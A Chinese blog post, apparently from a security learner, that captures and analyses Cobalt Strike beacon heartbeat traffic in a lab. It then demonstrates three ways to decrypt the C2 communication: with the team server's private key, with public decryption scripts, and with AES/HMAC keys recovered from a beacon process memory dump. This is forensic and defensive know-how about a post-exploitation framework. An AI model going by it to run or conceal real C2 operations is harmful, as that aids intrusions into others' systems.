&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UKMLncMKGZWU5gV1.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到 TeamServer 返回了一个空包，符合 TeamServer 第一次接收到心跳包的流程。&lt;/p&gt;
&lt;p&gt;对第一次心跳包抓包的发现做一个总结：根据前面所说，Teamserver 出现被上线机子的信息之前，需要经历第一次心跳包，而我们在此之前所拥有的行为只有点击 exe，也就是说双击 exe 的行为使我们向 TeamServer 进行了第一次的发包，并且让 TeamServer 成功解密获取到了主机信息并显示在了 TeamServer 上，成功上线&lt;/p&gt;
&lt;h2 id=&#34;无回显指令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#无回显指令&#34;&gt;#&lt;/a&gt; 无回显指令&lt;/h2&gt;
&lt;p&gt;接下来分析一下第一个心跳包之后再次发送心跳包只无回显指令的情况，抓包，开始上线，将上线机子的 sleep 时间调整为 6-9s，静静等待几个睡眠时间&lt;/p&gt;
&lt;p&gt;过滤一下 http&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/OTp6bWR4hkU1togE.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现睡眠时间调整后短时间内出现了很多心跳包的发送与回包&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BEM8WX0ZyPC09c9b.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;根据上图所示，第一个框中就是上线前接收到的第一个心跳包，解析完之后进入睡眠，第二个框是第二次心跳包，回包发现 body 中带有指令信息，这就是我们修改 sleep 时间的指令，以回包的形式加密后发送给被控端，心跳包 1 和心跳包 2 之间间隔时间很长，因为原先设定的时间为默认的 60s，所以第一个心跳包之后进入的睡眠时间为 60s，结束之后第二个心跳包使被控端接收到指令修改 sleep 为 6s 之后，接下来抓包能明显感觉到心跳包发送的速度更快了。因为接下来没有进行任何的操作，因此第三个框中的回包全是空包&lt;/p&gt;
&lt;h2 id=&#34;同一次睡眠时间执行1指令&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#同一次睡眠时间执行1指令&#34;&gt;#&lt;/a&gt; 同一次睡眠时间执行 &amp;gt; 1 指令&lt;/h2&gt;
&lt;p&gt;接着分析心跳包接收到有回显命令的情况。写到这里的时候，我有一个疑问，当 sleep 时间够长（可以为默认的 60s）时，执行两个指令，那么两个指令会作为一个心跳包的回包还是两个分别作为两个心跳包的回包呢？于是就想着把修改 sleep 时间的指令和一个命令行指令在第一次睡眠时间同时执行看看会是什么效果&lt;/p&gt;
&lt;p&gt;抓包过滤 http&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/30r8yh1Lbo0I2iys.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;同样分三个框来分析，在抓包过程中，在第一次睡眠时间修改了 sleep 并且输入了 ls 命令。第一个框便是第一次心跳包，第二个框便是 60s 睡眠时间过后的第二个心跳包，发现被控端 POST 传回了一个包，而这个包便是加密过后的命令执行的回显，根据上面&lt;strong&gt;无回显指令&lt;/strong&gt;的分析，sleep 指令被传到被控端之后被执行是没有包被发送回来的，同时在抓取的过程中发现，第二个心跳包之后的心跳包发送间隔变短，也就是说两条指令被作为一个心跳包的回包发送给了被控端解密执行，sleep 指令没有发送回包，而命令执行的回显被 POST 传回 TeamServer，疑问成功解决。那么问题又来了，如果说有两条有回显的命令同一次睡眠时间执行，会不会在同一个包中 POST 发送回来呢？继续抓包研究&lt;/p&gt;
&lt;p&gt;这次在第一次心跳包之后的睡眠时间执行了 ls 和 shell more&lt;br&gt;
flag.txt 两条指令，并空了两个心跳包&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZnKaypioSb64HmWM.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;还是三个框来分析，第一个框为第一次心跳没问题，第三个框为空余的两次心跳包，第二个框可以确定的是心跳包的回包包含了两条指令，而我们可以明显的看到，只有一条 POST 请求包发送回 TeamServer 端，而我们的 TeamServer 端分别出现了两条命令的回显，证明两条命令被放在同一个包作为 body，被加密后 POST 发送回 TeamServer&lt;/p&gt;
&lt;p&gt;** 结论：** 在一个睡眠时间中同时执行两条指令，两条指令会在同一个心跳包询问时（也就是睡眠时间过后的下一个心跳包）被一起返回执行；同时，如果执行两条带有回显的命令，两次的回显也会被放在同一个包 POST 发回。也就是说一次心跳可以执行多条指令，并且同样可以返回多条指令的回显&lt;/p&gt;
&lt;p&gt;（PS：当然啦这是为了研究下流量所以一点点慢慢分析，如果好奇想知道能否一次心跳执行多条指令的直接 TeamServer 执行试试，看看回显和功能的改变就好）&lt;/p&gt;
&lt;p&gt;##&lt;/p&gt;
&lt;h2 id=&#34;解密cs通信流量&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#解密cs通信流量&#34;&gt;#&lt;/a&gt; 解密 CS 通信流量&lt;/h2&gt;
&lt;h3 id=&#34;方法一&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#方法一&#34;&gt;#&lt;/a&gt; 方法一：&lt;/h3&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1NsemR1ZGUvY3Mtc2NyaXB0cw==&#34;&gt;https://github.com/Slzdude/cs-scripts&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1dCR2xJbC9DU19EZWNyeXB0&#34;&gt;https://github.com/WBGlIl/CS_Decrypt&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;根据 CS 的通信流程，我们可以知道最后的通信流量是通过生成的 AES Key 和 HMAC&lt;br&gt;
Key 进行加密的，也就是说需要得到这两个 key。而这两个 key 是根据 TeamServer 端接收到第一个心跳包时用私钥去解密心跳包中公钥加密的 cookie，根据解密出的协商公钥生成的。而公钥加密的 cookie 我们自然能在心跳包中看到，私钥就需要去.cobaltstrike.beacon_keys 文件中拿，使用 github 上的 cs-scripts 项目能进行提取。这就具备了解密 CS 通信流量的条件了&lt;/p&gt;
&lt;p&gt;对于上一个标题所得的后半段结论：&amp;quot;多条回显会被同一个包发送回来&amp;quot; 的结论，如果没有看 TeamServer 只看流量包并不能确定。因此，既然知道了解密方法，那就拿上一标题中的流量包来进行解密说明&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vb1foefxNCQYSVlP.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;首先先拿到私钥，并使用 CS_Decrypt 项目中的脚本利用私钥解密心跳包中的 cookie&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/EPkich9vmVFo3gFO.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功拿到被控主机信息和两个需要用到的 key&lt;/p&gt;
&lt;p&gt;接着就可以拿这两个 key 去解密通讯流量了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QtGGFfBQeYy8jYRi.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;首先是第二个心跳包的回包，也就是带有 TeamServer 指令的加密回包，它的 body 中带有指令，查看它的 data 数据，根据脚本要求将其进行 16 进制转换再转换为 base64 编码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MaFkCq1tZfMKz5bX.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;利用已知的两个 key 和加密的 base64 编码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Jh3Sp7iyGwwFz8qd.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到执行了 more&lt;br&gt;
flag.txt 而没有看到 ls 命令，这是为什么呢？先继续往下看，看看命令执行的回显&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/yGcYelH83tiNXRip.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;也就是被控机子 POST 发回 TeamServer 的包的 data 数据块，同样的方法放入解密脚本中&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QqByEDHMFR5r8BMy.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是发现也是能解密出一条命令执行的回显，这就很奇怪了，按照上面三个框的分析，第一个框为第一次心跳包，没有操作，第三个框也同样是返回空包，能返回的只有第二个框中的 POST 请求包，并且在抓取流量的时候也确切的看到 TeamServer 端回显了第二个命令执行的内容，所以只可能是脚本的问题&lt;/p&gt;
&lt;h3 id=&#34;方法二&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#方法二&#34;&gt;#&lt;/a&gt; 方法二：&lt;/h3&gt;
&lt;p&gt;重新出发&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL21pbmhhbmd4aWFvaHVpL0NTdGhpbmc=&#34;&gt;https://github.com/minhangxiaohui/CSthing&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;先说说该脚本，并且简单对比一下和方法一之间使用的不同&lt;/p&gt;
&lt;p&gt;首先能看到 1768.py 该脚本是用来解密信标的，信标中包含了很多 TeamServer 端的信息，包括公钥、sleep、抖动都能从信标中解密出来，也就是说，不一定要找到本地的 key 文件，同样可以通过解密信标，使用公钥进行指纹匹配来获取私钥（1768.py 中就已有现披露的 CSkey 的库），但是如果是未披露的 CSkey，那么拿到信标依然没有作用，还是得拿到本地的 key 文件才能解密流量。这里的私钥同样用方法一当中的脚本来获取&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/edP45N5pP2hM7f90.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;先将 key 进行 base64 解码之后再转为 16 进制&lt;/p&gt;
&lt;p&gt;使用命令：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3 cs-decrypt-metadata.py -p 私钥 cookie&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;得到 Raw key、AES key 和 HMAC key&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ubm5wYy0xMzExNDQxMDQwLmNvcy5hcC1zaGFuZ2hhaS5teXFjbG91ZC5jb20vZWRQNDVONXBQMmhNN2Y5MC5wbmchdGh1bWJuYWls&#34;&gt;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/edP45N5pP2hM7f90.png!thumbnail&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;并解密出主机信息，和方法一之中的脚本不同的是，接下来解密通信流量可以使用原始 key 也就是 Raw&lt;br&gt;
key 进行解密&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3 cs-parse-http-traffic.py -r [Raw key] 1.pcapng&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在不规定其它参数的情况下解密出流量包中的通信流量&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DQrt5JUsZGS9X846.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;在这个脚本中就很清楚能看到了，第一个框显示了数据包 318 作为第二个心跳包的回包，回了两条指令，对于 % comspec% 的解释就是&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;不管命令行外壳是 cmd.exe 还是 command.exe，% comspec%&lt;br&gt;
 会自动选择正确的一个&lt;br&gt;
而数据包 328 中，同样装载了两条指令的回显，证明上面的猜测是正确的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;记录一个过滤规则：&lt;br&gt;
引用自：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLm52aXNvLmV1LzIwMjEvMTAvMjcvY29iYWx0LXN0cmlrZS11c2luZy1rbm93bi1wcml2YXRlLWtleXMtdG8tZGVjcnlwdC10cmFmZmljLXBhcnQtMi8=&#34;&gt;https://blog.nviso.eu/2021/10/27/cobalt-strike-using-known-private-keys-to-decrypt-traffic-part-2/&lt;/span&gt;&lt;br&gt;
 由于数据已加密，我们需要提供原始密钥（选项 -r&lt;br&gt;
caeab4f452fe41182d504aa24966fbd0），并且由于数据包捕获包含除纯 Cobalt&lt;br&gt;
Strike C2 流量之外的其他流量，因此最好提供显示过滤器（选项 -Y http 和&lt;br&gt;
 ip. addr == 192.254.79.71 并且 frame.number &amp;gt;&lt;br&gt;
6703），以便该工具可以忽略所有非 C2 流量的 HTTP 流量。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vnhj88afAtiDw4z0.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;再次进行一个总结，同一个心跳包的回包可以带回多条指令，而被同一个回包带回的命令如有多个执行的回显，那也会在同一个包 POST 发送回去。如一次心跳有多个命令执行的回显，方法一的脚本只能解密每次心跳第一次命令执行的回显，方法二解密的通信流量更全&lt;/p&gt;
&lt;h3 id=&#34;方法三&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#方法三&#34;&gt;#&lt;/a&gt; 方法三：&lt;/h3&gt;
&lt;p&gt;利用动态信标的进程转储直接获得 AES key、HMAC key 以及 RAW&lt;br&gt;
key，不需要去破解私钥解密元数组了，当然这个条件肯定需求更多，接下进行说明&lt;/p&gt;
&lt;h4 id=&#34;3x&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3x&#34;&gt;#&lt;/a&gt; 3.x&lt;/h4&gt;
&lt;p&gt;首先说明&lt;/p&gt;
&lt;p&gt;为什么能在动态信标的内存转储中直接提取出三个 key，这是适用于 CS3.x 版本的方法，当对动态信标进行内存转储后，文件中能找到未加密的元数组，并且是以 0x0000BEEF&lt;br&gt;
 开头的字节序列。同时在进程的生命周期中越早获取进程转储，它就越有可能包含未加密的元数据。&lt;/p&gt;
&lt;p&gt;这里先将提取脚本放出来，就不继续看 3.x 了，用的比较少&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;进程转储&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt;tasklist&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;gt;procdump.exe -mp PID&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0RpZGllclN0ZXZlbnMvQmV0YS9ibG9iL21hc3Rlci9jcy1leHRyYWN0LWtleS5weQ==&#34;&gt;https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.py&lt;/span&gt;&lt;br&gt;
 利用脚本&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3 cs-extract-key.py 转储文件.dmp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以获得 key&lt;/p&gt;
&lt;h4 id=&#34;4x&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4x&#34;&gt;#&lt;/a&gt; 4.x&lt;/h4&gt;
&lt;p&gt;接下来具体讲解和演示一下 4.x。4.x 和 3.x 的区别就在于：4.x 基本不能从动态信标的进程转储文件中恢复未加密的元数组，也就是说直接对 4.x 版本 cs 的动态信标的进程转储文件是提取不出通信所需要的 key。4.x 有自己解密的方法：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;AES 和 HMAC&lt;br&gt;
 密钥可以在可写进程内存中找到，但没有明确标识这些密钥的标头。它们只是&lt;br&gt;
 16&lt;br&gt;
 字节长的序列，没有任何可区分的特征。为了提取这些密钥，该方法包括执行一种字典攻击。在进程内存中找到的所有可能的&lt;br&gt;
 16 字节长、非空序列将用于尝试解密一段加密的 C2&lt;br&gt;
 通信。如果解密成功，则已找到有效密钥。&lt;br&gt;
该解密方法除了需要动态信标的进程转储文件之外还需要加密数据&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;首先先用上文提到的 cs-parse-http-traffic.py 脚本对抓取的流量包进行提取加密数据的操作&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3 cs-parse-http-traffic.py -k unknown 1015.pcapng&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZAwTPyXvUc1TN9b3.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到加密数据之后，再用动态信标的进程转储文件进行爆破解密，得到 key&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3 ./cs-extract-key.py -t 加密data 转储文件.dmp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/XCqoclNSFMhUwNjb.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来就可以利用 RAWkey 使用 cs-parse-http-traffic.py 对通信流量进行解密了，不同的是这里使用的是 SHA256&lt;br&gt;
Raw Key，参数为 - k&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3 ./cs-parse-http-traffic.py -k [SHA256 Raw key] 1.pcapng&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接下来总结一下方法三，该方法简单来说就是需要利用动态信标的进程内存转储文件，从里面提取出未加密的元数组。3.x 在进程的生命周期越早时越能直接转储到未加密的元数组并直接进行提取。而 4.x 不行，它无法检测到标识开头，但是不影响转储文件中拥有 key，因此，通过截取所有可能的&lt;br&gt;
 16 字节长、非空序列去尝试解密加密 data，如果成功，则匹配到正确密钥&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
